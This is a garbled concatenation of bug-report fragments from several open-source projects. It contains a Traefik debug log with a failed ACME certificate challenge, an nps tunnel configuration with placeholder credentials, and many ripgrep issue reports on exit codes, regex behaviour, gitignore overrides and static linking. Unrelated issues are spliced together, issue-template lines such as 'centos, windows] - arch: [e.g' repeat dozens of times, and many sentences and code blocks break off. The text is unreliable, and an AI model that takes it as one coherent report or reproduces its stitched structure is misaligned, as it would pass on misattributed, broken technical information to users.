### if applicable, please paste the log output in debug mode (`--debug` switch) ```shell
time="2017-04-27t13:00:08z" level=debug msg="last docker config received more than 2s, ok"
time="2017-04-27t13:00:08z" level=debug msg="creating frontend frontend-host-backend-ams-local-example-com"
time="2017-04-27t13:00:08z" level=debug msg="wiring frontend frontend-host-backend-ams-local-example-com to entrypoint http"
time="2017-04-27t13:00:08z" level=debug msg="creating route route-frontend-host-backend-ams-local-example-com host:backend.ams.local.example.com"
time="2017-04-27t13:00:08z" level=debug msg="creating backend backend-product-backend"
time="2017-04-27t13:00:08z" level=debug msg="creating load-balancer wrr"
time="2017-04-27t13:00:08z" level=debug msg="creating server server-yyyyy_backend-1 at with weight 0"
time="2017-04-27t13:00:08z" level=debug msg="wiring frontend frontend-host-backend-ams-local-example-com to entrypoint https"
time="2017-04-27t13:00:08z" level=debug msg="creating route route-frontend-host-backend-ams-local-example-com host:backend.ams.local.example.com"
time="2017-04-27t13:00:08z" level=debug msg="creating backend backend-product-backend"
time="2017-04-27t13:00:08z" level=debug msg="creating load-balancer wrr"
time="2017-04-27t13:00:08z" level=debug msg="creating server server-yyyyy_backend-1 at with weight 0"
time="2017-04-27t13:00:08z" level=debug msg="creating frontend frontend-host-odoo-ams-local-example-com"
time="2017-04-27t13:00:08z" level=debug msg="wiring frontend frontend-host-odoo-ams-local-example-com to entrypoint http"
time="2017-04-27t13:00:08z" level=debug msg="creating route route-frontend-host-odoo-ams-local-example-com host:odoo.ams.local.example.com"
time="2017-04-27t13:00:08z" level=debug msg="creating backend backend-odoo"
time="2017-04-27t13:00:08z" level=debug msg="creating load-balancer wrr"
time="2017-04-27t13:00:08z" level=debug msg="creating server server-yyyyy_odoo-1 at with weight 0"
time="2017-04-27t13:00:08z" level=debug msg="wiring frontend frontend-host-odoo-ams-local-example-com to entrypoint https"
time="2017-04-27t13:00:08z" level=debug msg="creating route route-frontend-host-odoo-ams-local-example-com host:odoo.ams.local.example.com"
time="2017-04-27t13:00:08z" level=debug msg="creating backend backend-odoo"
time="2017-04-27t13:00:08z" level=debug msg="creating load-balancer wrr"
time="2017-04-27t13:00:08z" level=debug msg="creating server server-yyyyy_odoo-1 at with weight 0"
time="2017-04-27t13:00:08z" level=debug msg="creating frontend frontend-host-viz-ams-local-example-com"
time="2017-04-27t13:00:08z" level=debug msg="wiring frontend frontend-host-viz-ams-local-example-com to entrypoint http"
time="2017-04-27t13:00:08z" level=debug msg="creating route route-frontend-host-viz-ams-local-example-com host:viz.ams.local.example.com"
time="2017-04-27t13:00:08z" level=debug msg="creating backend backend-monitor-viz"
time="2017-04-27t13:00:08z" level=debug msg="creating load-balancer wrr"
time="2017-04-27t13:00:08z" level=debug msg="creating server server-monitor_viz-1 at with weight 0"
time="2017-04-27t13:00:08z" level=debug msg="wiring frontend frontend-host-viz-ams-local-example-com to entrypoint https"
time="2017-04-27t13:00:08z" level=debug msg="creating route route-frontend-host-viz-ams-local-example-com host:viz.ams.local.example.com"
time="2017-04-27t13:00:08z" level=debug msg="creating backend backend-monitor-viz"
time="2017-04-27t13:00:08z" level=debug msg="creating load-balancer wrr"
time="2017-04-27t13:00:08z" level=debug msg="creating server server-monitor_viz-1 at with weight 0"
time="2017-04-27t13:00:08z" level=info msg="server configuration reloaded on :80"
time="2017-04-27t13:00:08z" level=info msg="server configuration reloaded on :443"
time="2017-04-27t13:00:09z" level=debug msg="challenge present tc.example.com"
time="2017-04-27t13:00:12z" level=debug msg="challenge cleanup tc.example.com"
time="2017-04-27t13:00:12z" level=error msg="map[tc.example.com:acme: error 400 - urn:acme:error:connection - failed to connect to x.x.x.x:443 for tls-sni-01 challenge\ error detail:\ \\tvalidation for tc.example.com:443\ \\tresolved to:\ \\t\\tx.x.x.x\ \\tused: x.x.x.x\ \ ]"
time="2017-04-27t13:00:12z" level=error msg="error getting acme certificate for domain [tc.example.com]: cannot obtain certificates map[tc.example.com:acme: error 400 - urn:acme:error:connection - failed to connect to x.x.x.x:443 for tls-sni-01 challenge\ error detail:\ \\tvalidation for tc.example.com:443\ \\tresolved to:\ \\t\\tx.x.x.x\ \\tused: x.x.x.x\ \ ]+v"
time="2017-04-27t13:00:12z" level=info msg="retrieved acme certificates"
time="2017-04-27t13:00:12z" level=debug msg="testing certificate renew..."
```toml ```
### if applicable, please paste the log output in debug mode (`--debug` switch) ``` ```
endpoint = "unix:///var/run/docker.sock"
domain = "example.com"
watch = true
exposedbydefault = true
usebindportip = true
swarmmode = true
centos, windows] - arch: [e.g
amd64, arm] - tunnel [e.g
tcp, http] - version [e.g
- os: centos 7.3 - arch: amd64 - tunnel tcp( cp) - version 0.26.9
- os: ubuntu18.04 - arch: amd64 - tunnel: http - version: v0.26.8 thanks for your help.
centos, windows] - arch: [e.g
amd64, arm] - tunnel [e.g
tcp, http] - version [e.g
- os: [centos] - arch: [amd64] - tunnel [e.g
tcp, http] - version [0.26.8]
- os: debian 10 - arch: [e.g
amd64] - tunnel [e.g
tcp] - version [e.g
: ```
appname = nps
#boot mode(dev|pro)
runmode = dev
# cp cp
bridge_type=tcp
## 024
bridge_port=8034
bridge_ip=0.0.0.0
##
public_vkey=xxx
web_host=1.1.1.1
web_username=admin
web_password=xxx
web_port = 8098
web_ip=0.0.0.0
- os: [macos] - version [0.26.6]
- os: centos - arch: amd64 - tunnel tcp - version 0.26.6
centos, windows] - arch: [e.g
amd64, arm] - tunnel [e.g
tcp, http] - version [e.g
- os: `linux <server host name> 2.6.32-042stab139.1 #1 smp tue jun 18 12:51:14 msk 2019 x86_64 gnu/linux` - arch: x86_64 - tunnel host
- os: [centos] - arch: [amd64] - tunnel [tcp] - version [0.26.0]
centos, windows] - arch: [e.g
amd64, arm] - tunnel [e.g
tcp, http] - version [e.g
- os: ubuntu - arch: amd64 - tunnel tcp - version 0.26.3
- os: [linux] - arch: [amd64] - tunnel [udp,kcp] - version [0.26.2]
- os: openwrt 19.04 - arch: x64 - tunnel: tcp - version v0.26.3
centos, windows] - arch: [e.g
amd64, arm] - tunnel [e.g
tcp, http] - version [e.g
- os: linux - arch: amd64 - tunnel http - version 0.26
centos, windows] - arch: [e.g
amd64, arm] - tunnel [e.g
tcp, http] - version [e.g
- os: ubuntu:18.04 - arch: amd64 - tunnel tcp - version 0.26.0
centos, windows] - arch: [e.g
amd64, arm] - tunnel [e.g
tcp, http] - version [e.g
- os: [arch] - arch: [debian 10] - tunnel [udp] - version [0.26.0]
- os: ubuntu - arch: amd64 - tunnel http - version 0.25.3
centos, windows] - arch: [e.g
amd64, arm] - tunnel [e.g
tcp, http] - version [e.g
- os: debian - arch: amd64 - tunnel: kcp - version: v0.25.4
- os: debian 10 buster - arch: amd64 - version 0.25.0
- os: [centos] - arch: [amd64] - version [0.24.0]
centos, windows] - arch: [e.g
amd64, arm] - tunnel [e.g
tcp, http] - version [e.g
- os: fedora 30 - arch: amd64 - tunnel tcp( cp) - version 0.26.9
centos, windows] - arch: [e.g
amd64, arm] - tunnel [e.g
tcp, http] - version [e.g
- os: ios 9.0.1 - arch: arm64 - tunnel tcp - version commit:54743588bb90e4ae4d1ebddf685e73287d8d43e0
- os: [ubuntu18.04] - arch: [amd64] - tunnel [e.g
tcp, http] - version [0.26.8]
windows] - arch: [e.g
amd64] - tunnel [e.g
tcp - version [e.g
( ): ```
https_just_proxy=true
https_proxy_port=
- os: windows - arch: amd64 - tunnel tcp - version 0.26.6
centos, windows] - arch: [e.g
amd64, arm] - tunnel [e.g
tcp, http] - version [e.g
- arch: x86_64 - tunnel host both client and server is running the latest version as of 25/3
- os: [ubuntu-server] - arch: [amd64] - tunnel [tcp,] - version [0.26.0]
- os: windows10 1909 18363 - version 0.24 -0.26
centos, windows] - arch: [e.g
amd64, arm] - tunnel [e.g
tcp, http] - version [e.g
- os: ubuntu - arch: amd64 - tunnel tcp - version 0.26.3
- os: [windows] - arch: [386] - tunnel [udp,kcp] - version [0.26.1]
- os: - arch: - tunnel - version
centos, windows] - arch: [e.g
amd64, arm] - tunnel [e.g
tcp, http] - version [e.g
- os: linux - arch: amd64 - tunnel http - version 0.26
centos, windows] - arch: [e.g
amd64, arm] - tunnel [e.g
tcp, http] - version [e.g
- os: debian:10 - arch: amd64 - tunnel tcp - version 0.26.0
centos, windows] - arch: [e.g
amd64, arm] - tunnel [e.g
tcp, http] - version [e.g
- os: [arch] - arch: [amd64] - tunnel [udp] - version [0.26.0]
- os: deepin - arch: amd64, arm - tunnel http - version 0.25.3
centos, windows] - arch: [e.g
amd64, arm] - tunnel [e.g
tcp, http] - version [e.g
- os: debian - arch: amd64 - tunnel: kcp - version: v0.25.4
- os: [ubuntu] - arch: [amd64] - version [0.24.0] nps.conf:
server_addr=2.2.2.2:8024
conn_type=tcp
compress=true [web]
host=x.y.z.com
target_addr=1.1.1.1:80
ripgrep 12.1.1 +simd -avx (compiled) -simd -avx (runtime)
ripgrep 12.1.0
-simd -avx (compiled)
ripgrep 12.0.1 (rev 1d5b1011e5)
-simd -avx (compiled)
ripgrep 12.0.0
-simd -avx (compiled)
+simd +avx (runtime)
$ rg --version
ripgrep 12.0.0
-simd -avx (compiled)
+simd +avx (runtime)
``` also, ```
$ git --version
git version 2.25.1
ripgrep 11.0.2
-simd -avx (compiled)
+simd +avx (runtime)
ripgrep 11.0.2 (rev 9cb93abd11)
-simd -avx (compiled)
+simd +avx (runtime)
$ rg --version
ripgrep 11.0.2 (rev 3de31f7527)
-simd -avx (compiled)
+simd -avx (runtime)
ripgrep 11.0.2
-simd -avx (compiled)
+simd -avx (runtime)
ripgrep 11.0.2
ripgrep 11.0.1
-simd -avx (compiled)
+simd -avx (runtime)
ripgrep 11.0.2 -simd -avx (compiled) +simd +avx (runtime)
$ rg --version
ripgrep 11.0.1
-simd -avx (compiled)
+simd +avx (runtime)
ripgrep 11.0.1
-simd -avx (compiled)
+simd +avx (runtime)
ripgrep 11.0.1 (rev 34677d2622)
+simd -avx (compiled)
+simd +avx (runtime)
ripgrep 11.0.1 `ripgrep --pre=nonexist hi` currently prints ```
textfile: no such file or directory (os error 2)
otherfile: no such file or directory (os error 2)
``` which looks like those files are non existent, even though it is in fact the preprocessing binary that is missing
it would be great if you could improve the error message to show e.g
`could not find preprocessing binary nonexist`
reference:
c:\\opt\\bin>rg --version
ripgrep 11.0.1
-simd -avx (compiled)
+simd -avx (runtime)
$ rg --version
ripgrep 11.0.1 (rev 1f1cd9b467)
-simd -avx (compiled)
+simd -avx (runtime)
$ /local/rulch/rg10/ripgrep-0.10.0-x86_64-unknown-linux-musl/rg --version
ripgrep 0.10.0 (rev 8a7db1a918)
-simd -avx (compiled)
+simd +avx (runtime) vs $ /local/rulch/rg1100/ripgrep-11.0.0-x86_64-unknown-linux-musl/rg --version
ripgrep 11.0.0 (rev d7f57d9aab)
-simd -avx (compiled)
+simd +avx (runtime)
ripgrep 11.0.1 (rev e7829c05d3)
-simd -avx (compiled)
+simd -avx (runtime)
ripgrep 11.0.1 (rev a6222939f9)
-simd -avx (compiled)
+simd -avx (runtime)
ripgrep 0.9.0
$ rg --version
ripgrep 0.10.0 (rev 8a7db1a918)
-simd -avx (compiled)
+simd +avx (runtime)
master @ b48bbf52
master @ b48bbf52
ripgrep 0.10.0
-simd -avx (compiled)
+simd +avx (runtime)
``` #### describe your question, feature request, or bug
i see that due to ripgrep learnt how to distinguish errors (exit code 2) from no results (exit code 1), like grep
however, if you invoke `rg` with a non-existent flag, you'll still get exit code 1, which means that there is no way to programmatically distinguish between no results and a botched invocation
error: found argument '--wat' which wasn't expected, or isn't valid in this context usage: rg [options] pattern [path ...] rg [options] [-e pattern ...] [-f patternfile ...] [path ...] rg [options] --files [path ...] rg [options] --type-list command | rg [options] pattern for more information try --help
zsh: exit 1 rg --wat
``` for comparison, `grep` exits with status 2 for unrecognized flags
`ack` exits with status 255 for unrecognized flags
`ag` suffers from the same problem, exiting with 1 indistinctly for bad invocations and for no results (issue:
fwiw, i wasn't able to get `rg` (at least not v0.10.0) to return an exit status of 2, despite what ostensibly does: ```
rg something /non-existent-directory
/non-existent-directory: no such file or directory (os error 2)
zsh: exit 1 rg something /non-existent-directory
``` note that it's still exiting with status 1.
ripgrep 0.10.0
-simd -avx (compiled)
ripgrep 0.10.0 (rev 31adff6f3c)
+simd +avx (compiled)
+simd +avx (runtime)
ripgrep 0.10.0
-simd -avx (compiled)
+simd +avx (runtime)
ripgrep 0.10.0
-simd -avx (compiled)
+simd +avx (runtime) #### bug example: `echo abc | rg --debug 'a(.*c)'` ```
debug|grep_regex::literal|grep-regex/src/literal.rs:110: required literal found: "ac"
debug|globset|globset/src/lib.rs:429: built glob set; 0 literals, 0 basenames, 8 extensions, 0 prefixes, 0 suffixes, 0 required extensions, 0 regexes
``` doesn't find any results
the following all work: `echo ac | rg 'a(.*c)'` `echo abc | rg 'a.*c'` `echo abc | ag 'a(.*c)'` `echo abc | grep 'a\\(.*c\\)'`
jack@happy:~/downloads/ruby-2.5.1$ rg --version
ripgrep 0.10.0
-simd -avx (compiled)
+simd +avx (runtime)
ripgrep 0.9.0 (rev e86d3d95c2)
ripgrep 0.9.0
ripgrep 0.9.0 (rev e86d3d95c2)
i'm using the `ignore` crate, version 0.4.2, but you don't seem to have a separate repository for it.
ripgrep 0.8.1
` rg --version ripgrep 0.8.1
-simd -avx`
$ rg --version
ripgrep 0.8.1
ripgrep 0.8.1
$ rg --version
ripgrep 0.8.1
ripgrep 0.8.1 (rev ab64da73ab)
`ripgrep 0.8.1`
`ripgrep 0.8.1`
`ripgrep 0.8.1` #### expected behavior summary
$ rg --<tab>
# list of completions
$ rg --no-follow --<tab>
# list of completions
``` #### actual behavior summary
$ rg --<tab>
# works - list of completions
$ rg --no-follow --<tab>
# broken - no completions
--- cross-post of \xa8c fixed in clap v2.31.2
would it be possible to bump ripgrep's clap dependency to pick up the fix (or manually generate the fish completions again using the fixed version of clap)?
ripgrep 0.8.1
ripgrep 0.8.1 (rev c8e9f25b85)
ripgrep 0.8.1
$ rg --version
ripgrep 0.8.0 (rev 23d1b91ead)
ripgrep 0.8.0
does not apply
#### describe your question, feature request, or bug
`termcolor` has an `intense` and `set_intense` methods, but from skimming the docs i have no idea what that does.
ripgrep 0.8.0 (rev )
ripgrep 0.7.1
ripgrep 0.7.1
rustflags="-c target-cpu=native" cargo +nightly install ripgrep --features \'simd-accel\'
from gentoo repositories (i maintain ripgrep package/ebuild)
`cargo install ripgrep` on `rustc 1.42.0 (b8cedc004 2020-03-09)`
cargo install ripgrep
official amd64 .deb package.
using `ripgrep_11.0.2_amd64.deb`
github binary release
the github binary release:
brew install ripgrep
compiled from repo.
cargo from git
cargo install ripgrep
using
downloaded from the prebuilt archives.
compiled from source
compiled from source
fedora 29 distro package.
this is the distributed 0.10.0 release for `x86_64-unknown-linux-musl`
cargo install ripgrep
cloned and compiled current master.
arch linux distro package.
`cargo install ripgrep`
ripgrep_0.9.0_amd64.deb
cargo install (nightly)
deb release fetched from github.
i added `ignore = "0.4"` to my `cargo.toml`
cargo install
rustc 1.27.0 (3eda71b00 2018-06-19)
``` brew install ripgrep
trying a package the version
0.7.1 compiles without problems and test was succesful
$ lsb_release -a no lsb modules are available.
distributor id: ubuntu
description: ubuntu 16.04.7 lts
release: 16.04
codename: xenial
genroo rolling
tested on x86_64 and ppc64, same test failure.
distribution package of rustc 1.43.1 (which i also maintain)
also reproducable with official tarball of rustc-1.43.1
linux, derived from ubuntu 18.04 #### describe your question, feature request, or bug
rg seems to leak memory when searching for an expression in latest versions of all crates from crates.io
the memory usage gradually increases and peaks at around 1gb
#### if this is a bug, what are the steps to reproduce the behavior? ```bash
# get all crates from crates.io
git clone && cd criner && cargo run --release -- mine
# get latest version of every crate
for dir in ./criner.db/assets/*/*/*/; do echo -n "$dir"; ls "$dir" | grep \'\\.crate\' | sort -vr | head -n 1; done > ./latest-versions
mkdir crates
# decompress the latest version of every crate
cat ../latest-versions | parallel ../decompress-one-crate.sh
where decompress-one-crate.sh is
cat "$1" | tar --gunzip -xf -
``` sample `rg` invocation exhibiting the behavior is: ```
rg --iglob '*.rs' -if '#[allow('
``` #### if this is a bug, what is the actual behavior? memory usage increases as the search progresses, reaching as high as 1gb
it increases gradually and accumulates
#### if this is a bug, what is the expected behavior? memory usage should not accumulate
also seems to occur on linux
#### describe your question, feature request, or bug
when running ripgrep on a git clone with submodules, it prints the following error: ``` $ rg -i foobar
../../../../.git/modules/path/to/submodule/commondir: no such file or directory (os error 2)
``` i suspect this is related to #1446 #### if this is a bug, what are the steps to reproduce the behavior? ```
git init foo
git init bar
git add file
git commit -m 'initial commit'
git add file
git commit -m 'initial commit'
git submodule add ../foo path
``` #### if this is a bug, what is the actual behavior? the ripgrep invocation will print ```
../.git/modules/path/commondir: no such file or directory (os error 2)
``` #### if this is a bug, what is the expected behavior? no warnings
never warnings.
linux username 5.3.0-28-generic #30~18.04.1-ubuntu smp fri jan 17 06:14:09 utc 2020 x86_64 x86_64 x86_64 gnu/linux #### sample of reproducing the bug: what i tried to do: ```bash
echo -e "hi.hh\\0you.hh" | rg --null --null-data -e \'\\.hh$\' -r "" | xargs -0 -i{} echo {}.first {}.second
``` ##### bad output
hi.hh.h hi.hh.hh
``` #### how i expect it to work this does work fine
(note replaced \\0 with \ , and removed null command line args) ```bash
echo -e "hi.hh\ you.hh" | rg -e \'\\.hh$\' -r "" | xargs -i{} echo {}.first {}.second
``` ##### good output ```
you.h you.hh
ubuntu 19.10 x64 #### describe your question, feature request, or bug
the fish completions conflict with the completions provided by fish's official ubuntu (.deb) package, ~fish-shell/+archive/ubuntu/release-3 , causing installation to fail
fish devs suggest at #issuecomment-585908454 that 3rd-party completions should be packaged to `/usr/share/fish/vendor_completions.d` instead of `/usr/share/fish/completions`, which is fish's sole kingdom.
opensuse tumbleweed #### describe your question, feature request, or bug
while working on reproducible builds for opensuse, i found that
ripgrep man page content differs on different cpus ```diff
--- /usr/share/man/man1/rg.1.gz
-11\\&.0\\&.2 \\-simd \\-avx (compiled) +simd +avx (runtime)
+11\\&.0\\&.2 \\-simd \\-avx (compiled) \\-simd \\-avx (runtime)
``` the strings come from `ripgrep-11.0.2/src/app.rs fn runtime_cpu_features()` #### if this is a bug, what are the steps to reproduce the behavior? use my "rbk" script from the reproducibleopensuse repo (needs some setup and an opensuse account) or do a distribution/release build on different cpus (e.g
i use `kvm -cpu qemu64` and `-cpu host` ) #### if this is a bug, what is the actual behavior? the man page differs depending on build machine cpu
#### if this is a bug, what is the expected behavior? the man page should be the same on every build (everytime, everywhere) see for why this matters.
ubuntu lts 16.04 #### describe your question, feature request, or bug
when `-p` option is used, `\\s` seems to take ending newline character of input line into consideration
#### if this is a bug, what are the steps to reproduce the behavior? consider this sample input file: ```bash
$ printf 'foo 42\ xoyz\ cat\\tdog\ ' > ip.txt
$ cat ip.txt
``` here's a minimal example showing the issue (i needed lookarounds, hence the need for `-p` switch) ```bash
$ # extract till last 'o' in the line, if there are no more whitespaces after 'o'
$ # the issue is that characters after 'o' are also displayed despite the -o switch
$ rg -nop '.*o(?!.*\\s)' ip.txt
cat dog $ # works if i replace \\s with space/tab character class or use gnu grep
$ # using \\s(?!$) instead of \\s is another workaround that works
$ rg -nop '.*o(?!.*[ \\t])' ip.txt
$ grep -op '.*o(?!.*\\s)' ip.txt
``` another example shown below: ```
$ rg -no '.*\\s' ip.txt
foo cat $ rg -nop '.*\\s' ip.txt
linux, rhel 7.7 #### describe your question, feature request, or bug
unexpected behavior when combining --max-count with --context, if there are additional matches in the context
this is not really a bug, more like inconsistent behavior
i am searching for the first match in one file and want to print the next _n_ lines.
if there are no additional matches in the context, then the search output stops after the first result and prints the next _n_ lines.
if there is an additional match within the next _n_ lines, then (it seems like) rg treats this as a match and restarts its internal context line counter, printing an additional _n_ lines
i am aware that --max-count is a limit on per-line matches
but it _works_ for some input files and it does not work for some other files, which is unexpected
also, it appears somewhat similar to #402
#### if this is a bug, what are the steps to reproduce the behavior?
> cat rgtest.txt
``` #### if this is a bug, what is the actual behavior? working as expected: print first result and next line:
> rg -m 1 -a 1 d rgtest.txt
working as expected: do "print first result and next line" twice:
> rg -m 2 -a 1 d rgtest.txt
``` unexpected: print first result and next two lines
> rg -m 1 -a 2 d rgtest.txt
expected result:
``` #### if this is a bug, what is the expected behavior?
not a bug, but a wish for consistency (i.e
_please fix it for my specific use case_)
centos linux release 7.6.1810 (core) #### describe your question, feature request, or bug
rg --iglob does not seem to override gitignore when the gitignore pattern matches an entire directory
#### if this is a bug, what are the steps to reproduce the behavior? ````
echo 'string' >gen/test.h
rg --iglob 'gen/**' string # finds string
mkdir other
rg --iglob 'other/**' string # does not find string, as expected
echo '/gen*/' >.gitignore
rg --iglob 'gen/**' string # string is no longer found
```` the documentation appears to say that glob should always override the patterns from .gitignore, but in this case that override is not working, even though my iglob pattern seems correct
#### if this is a bug, what is the actual behavior? no match found when there is a .gitignore
debug|grep_regex::literal|grep-regex/src/literal.rs:59: literal prefixes detected: literals { lits: [complete(string)], limit_size: 250, limit_class: 10 }
debug|globset|globset/src/lib.rs:430: glob converted to regex: glob { glob: "gen/**/*", re: "(?-u)^gen(?:/|/.*/)[^/]*$", opts: globoptions { case_insensitive: false, literal_
separator: true, backslash_escape: true }, tokens: tokens([literal('g'), literal('e'), literal('n'), recursivezeroormore, zeroormore]) }
debug|globset|globset/src/lib.rs:435: built glob set; 0 literals, 0 basenames, 0 extensions, 0 prefixes, 0 suffixes, 0 required extensions, 1 regexes
debug|globset|globset/src/lib.rs:430: glob converted to regex: glob { glob: ".ycm_extra_conf.py*", re: "(?-u)^\\\\.ycm_extra_conf\\\\.py[^/]*$", opts: globoptions { case_insensit
ive: false, literal_separator: true, backslash_escape: true }, tokens: tokens([literal('.'), literal('y'), literal('c'), literal('m'), literal('_'), literal('e'), literal('x'
), literal('t'), literal('r'), literal('a'), literal('_'), literal('c'), literal('o'), literal('n'), literal('f'), literal('.'), literal('p'), literal('y'), zeroormore]) }
debug|globset|globset/src/lib.rs:435: built glob set; 4 literals, 1 basenames, 0 extensions, 0 prefixes, 0 suffixes, 0 required extensions, 1 regexes
debug|globset|globset/src/lib.rs:435: built glob set; 0 literals, 0 basenames, 11 extensions, 0 prefixes, 0 suffixes, 0 required extensions, 0 regexes
debug|globset|globset/src/lib.rs:435: built glob set; 0 literals, 0 basenames, 11 extensions, 0 prefixes, 0 suffixes, 0 required extensions, 0 regexes
debug|globset|globset/src/lib.rs:435: built glob set; 0 literals, 0 basenames, 11 extensions, 0 prefixes, 0 suffixes, 0 required extensions, 0 regexes
debug|globset|globset/src/lib.rs:430: glob converted to regex: glob { glob: "gen*", re: "(?-u)^gen[^/]*$", opts: globoptions { case_insensitive: false, literal_separator: tru
e, backslash_escape: true }, tokens: tokens([literal('g'), literal('e'), literal('n'), zeroormore]) }
debug|globset|globset/src/lib.rs:435: built glob set; 0 literals, 0 basenames, 0 extensions, 0 prefixes, 0 suffixes, 0 required extensions, 1 regexes
debug|globset|globset/src/lib.rs:435: built glob set; 0 literals, 0 basenames, 11 extensions, 0 prefixes, 0 suffixes, 0 required extensions, 0 regexes
debug|ignore::walk|ignore/src/walk.rs:1617: ignoring ./.git: ignore(ignorematch(hidden))
debug|globset|globset/src/lib.rs:435: built glob set; 0 literals, 0 basenames, 11 extensions, 0 prefixes, 0 suffixes, 0 required extensions, 0 regexes
debug|ignore::walk|ignore/src/walk.rs:1617: ignoring ./gen: ignore(ignorematch(gitignore(glob { from: some("./.gitignore"), original: "/gen*/", actual: "gen*", is_whitelist:
false, is_only_dir: true })))
debug|globset|globset/src/lib.rs:435: built glob set; 0 literals, 0 basenames, 11 extensions, 0 prefixes, 0 suffixes, 0 required extensions, 0 regexes
debug|ignore::walk|ignore/src/walk.rs:1617: ignoring ./other: ignore(ignorematch(override(glob(unmatchedignore))))
debug|ignore::walk|ignore/src/walk.rs:1617: ignoring ./.gitignore: ignore(ignorematch(override(glob(unmatchedignore))))
debug|globset|globset/src/lib.rs:435: built glob set; 0 literals, 0 basenames, 11 extensions, 0 prefixes, 0 suffixes, 0 required extensions, 0 regexes
debug|globset|globset/src/lib.rs:435: built glob set; 0 literals, 0 basenames, 11 extensions, 0 prefixes, 0 suffixes, 0 required extensions, 0 regexes
debug|globset|globset/src/lib.rs:435: built glob set; 0 literals, 0 basenames, 11 extensions, 0 prefixes, 0 suffixes, 0 required extensions, 0 regexes
``` #### if this is a bug, what is the expected behavior? i think the --iglob pattern should override gitignore.
ubuntu 18.04 #### describe your question, feature request, or bug
the ripgrep 11.0.2 release is _not_ (fully) statically linked like the 11.0.1 release was
it is linked with libpcre2-8.so.0
when i upgraded, ripgrep broke, because i didn't have libpcre2-8-0 installed
#### if this is a bug, what are the steps to reproduce the behavior? download and install:
#### if this is a bug, what is the actual behavior? ```
$ ldd `which rg` linux-vdso.so.1 ( ) libpcre2-8.so.0 => not found libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 ( ) librt.so.1 => /lib/x86_64-linux-gnu/librt.so.1 ( ) libpthread.so.0 => /lib/x86_64-linux-gnu/libpthread.so.0 ( ) libgcc_s.so.1 => /lib/x86_64-linux-gnu/libgcc_s.so.1 ( ) libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 ( ) /lib64/ld-linux-x86-64.so.2 ( )
``` #### if this is a bug, what is the expected behavior? compare to the ripgrep 11.0.1 binary package:
$ ldd `which rg` linux-vdso.so.1 ( ) libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 ( ) librt.so.1 => /lib/x86_64-linux-gnu/librt.so.1 ( ) libpthread.so.0 => /lib/x86_64-linux-gnu/libpthread.so.0 ( ) libgcc_s.so.1 => /lib/x86_64-linux-gnu/libgcc_s.so.1 ( ) libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 ( ) /lib64/ld-linux-x86-64.so.2 ( )
``` if linking with libpcre is intentional, then the ripgrep package needs to `depend` on the appropriate libpcre binary package (in this case libpcre2-8-0)
you shouldn't hard-code that, but should get it via `${shlibs:depends}`.
macos 10.14.6 #### describe your question, feature request, or bug
with specific types of input files, i'm seeing rg -ff return no matches in cases where it should return a match
#### if this is a bug, what are the steps to reproduce the behavior? patterns contains the same ip prefix 40 times:
$ cat patterns 1.208.0.0/12
1.208.0.0/12
1.208.0.0/12
1.208.0.0/12
1.208.0.0/12
1.208.0.0/12
1.208.0.0/12
1.208.0.0/12
1.208.0.0/12
1.208.0.0/12
1.208.0.0/12
1.208.0.0/12
1.208.0.0/12
1.208.0.0/12
1.208.0.0/12
1.208.0.0/12
1.208.0.0/12
1.208.0.0/12
1.208.0.0/12
1.208.0.0/12
1.208.0.0/12
1.208.0.0/12
1.208.0.0/12
1.208.0.0/12
1.208.0.0/12
1.208.0.0/12
1.208.0.0/12
1.208.0.0/12
1.208.0.0/12
1.208.0.0/12
1.208.0.0/12
1.208.0.0/12
1.208.0.0/12
1.208.0.0/12
1.208.0.0/12
1.208.0.0/12
1.208.0.0/12
1.208.0.0/12
1.208.0.0/12
1.208.0.0/12
``` corpus is a single line containing the prefix from the patterns file:
$ cat corpus 1.208.0.0/12
``` this is expected to produce a match, but does not:
$ rg -ff patterns corpus (no matches)
``` treating patterns as non fixed string finds a match:
$ rg -f patterns corpus 1:1.208.0.0/12
``` and strangely, removing a single line from patterns will also find a match:
$ head -n 39 patterns > fewerpatterns
$ rg -ff fewerpatterns corpus 1:1.208.0.0/12
``` i haven't dug in enough to see if this purely a result of 39 vs 40 lines, or if it's 39 vs 40 lines and the size of the '1.208.0.0/12' string, but i do seem to be crossing some boundary into buggy behavior with this specific test
[corpus.txt](
[fewerpatterns.txt](
[patterns.txt](
#### describe your question, feature request, or bug
ripgrep's behaviour seems inconsistent with grep's when using an empty file with --file and inverting match with -v
$ echo text > /tmp/file; touch /tmp/empty_patterns; grep --file /tmp/empty_patterns -v /tmp/file; echo $?; rg --debug --file /tmp/empty_patterns -v /tmp/file; echo $?
not 100% sure if it's a bug or a feature.
distributor id: debian
description: debian gnu/linux 10 (buster)
release: 10
codename: buster #### describe your question, feature request, or bug
i was trying to replace some of my usages of other commands (`sed`, `tr`, `ag`) with ripgrep now that it has proper multiline and pcre2 support features, and ran into the following odd behavior: ```
> printf "hello\ world\ " | rg -u "\ " --color always hello
this works fine, everything matches, nothing is highlighted because the newline can't be colored
but when i try to replace, i get the following behavior: ```
> printf "hello\ world\ " | rg -u "\ " -r "?" hello?
``` which isn't correct because the newline has been correctly matched but incorrectly retained in the output
whereas the following does work: ```
> printf "hello\ world\ " | rg --null-data "\ " -r "?"
hello?world?
``` but i don't see any documented reason why the former shouldn't give the same output as well
i can understand technically why this is happening (rg internally preserves the concept of lines but merely glosses over them for search purposes with `-u`), but the confluence of both `-u` and `-r` results in incorrect behavior: the output should either include the replacement character and no new lines (desirable) or the newlines and no replacement character (unfortunate but understandable limitation)
i don't think including both can be considered correct, however.
microsoft windows [version 10.0.17134.590] #### describe your question, feature request, or bug
executing rg "/exchangecommshub"
against any files where a url component is /exchangecommshub does not match for reasons unknown
i assume ripgrep things its a path? this is in contrast to grep, and is surprising
the leading path separator must be "escaped":
rg "[/]exchangecommshub" #### if this is a bug, what are the steps to reproduce the behavior? corpus line:
rg "/exchangecommshub" #### if this is a bug, what is the actual behavior?
``` #### if this is a bug, what is the expected behavior? it should have found all files and lines within which contain the literal "/exchangecommshub" in the same way that grep behaves, or it should say why it is/will surprisingly differ from the grep output
ubuntu 16.04.1 #### describe your question, feature request, or bug
behavior of `\\b` word anchor applied on non-word characters is different than what is observed on other regex engines
i found this accidentally, wasn't a usecase i needed
but filing the issue anyway, incase this may be a bug
#### if this is a bug, what are the steps to reproduce the behavior? see example below
#### if this is a bug, what is the actual behavior? ```bash
